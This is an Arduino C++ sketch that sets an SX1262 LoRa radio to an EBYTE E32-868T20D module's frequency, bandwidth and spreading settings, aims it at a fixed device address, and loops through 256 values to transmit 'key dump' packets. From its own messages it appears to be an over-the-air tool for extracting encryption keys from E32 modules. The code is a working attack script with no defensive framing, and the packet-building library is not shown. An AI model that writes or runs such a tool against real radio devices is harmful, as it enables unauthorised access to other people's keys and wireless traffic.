#include <RadioLib.h>
#include <E32-868T20D.h>
#include <board.h>

// -------------------------- Configuration -------------------------- //

#define LORA_CS_PIN                 18
#define LORA_DIO1_PIN               33
#define LORA_RST_PIN                23
#define LORA_BUSY_PIN               32

// EBYTE E32-868T20D parameters
#define E32_CHANNEL                 0x09
#define E32_ADDRESS                 0x1310
#define E32_BASE_FREQUENCY_MHZ      862
#define E32_BANDWIDTH_KHZ           500
#define E32_SPREADING_FACTOR        11
#define E32_CODING_RATE_DENOM       5

// ------------------------------------------------------------------- //
;
SX1262 lora = new Module(LORA_CS_PIN, LORA_DIO1_PIN, LORA_RST_PIN, LORA_BUSY_PIN);
E32_868T20D e32;

void beginPMU() {
    initBoard();
}

void beginLora() {
    PMU->setPowerChannelVoltage(XPOWERS_ALDO2, 3300);
	PMU->enablePowerOutput(XPOWERS_ALDO2);
	lora.begin(E32_BASE_FREQUENCY_MHZ + E32_CHANNEL, E32_BANDWIDTH_KHZ, E32_SPREADING_FACTOR, E32_CODING_RATE_DENOM);
}

void setup() {
    Serial.begin(115200);
    beginPMU();
    beginLora();

    Serial.println("Dumping keys...");
    uint8_t packet[64];
    size_t len;
    for (int i = 0; i <= 0xFF; i++) {
        e32.generateKeyDumpPacket(E32_ADDRESS, (uint8_t)i, packet, &len);
        lora.transmit(packet, len);
        Serial.print("Completed: ");
        Serial.print(i+1); Serial.print("/"); Serial.println(256);
        delay(100);
    }
    Serial.println("Done!");
}

void loop() {}
